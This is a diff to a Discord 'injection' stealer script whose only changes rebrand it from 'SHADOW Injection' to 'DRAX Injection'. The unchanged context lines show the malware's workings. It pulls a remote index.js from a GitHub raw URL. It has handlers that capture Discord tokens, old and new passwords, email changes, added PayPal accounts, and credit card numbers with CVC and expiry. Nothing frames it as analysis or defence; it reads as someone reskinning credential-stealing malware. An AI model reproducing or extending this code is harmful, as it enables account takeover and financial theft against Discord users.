@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'SHADOW Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1138198116311498785/1150411591959986227/SHADOW14.gif'.replace(/ /g, '%20'), 
+  embed_name: 'DRAX Injection', 
+  embed_icon: 'https://cdn.discordapp.com/avatars/740676427602591764/97b66df7f22b94192d051bfb87652c03.png?size=1024'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/Hassantk343/injection1/main/injection/main/index.js', 
   /**
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By SHADOW & ☇𝗞𝟭・',
+          text: '🎉・Discord Injection By DRAX・',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By SHADOW & ☇𝗞𝟭・',
+          text: '🎉・Discord Injection By DRAX・',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By SHADOW & ☇𝗞𝟭・',
+          text: '🎉・Discord Injection By DRAX・',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By SHADOW & ☇𝗞𝟭・',
+          text: '🎉・Discord Injection By DRAX・',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By SHADOW & ☇𝗞𝟭・',
+          text: '🎉・Discord Injection By DRAX・',
         },
       },
     ],
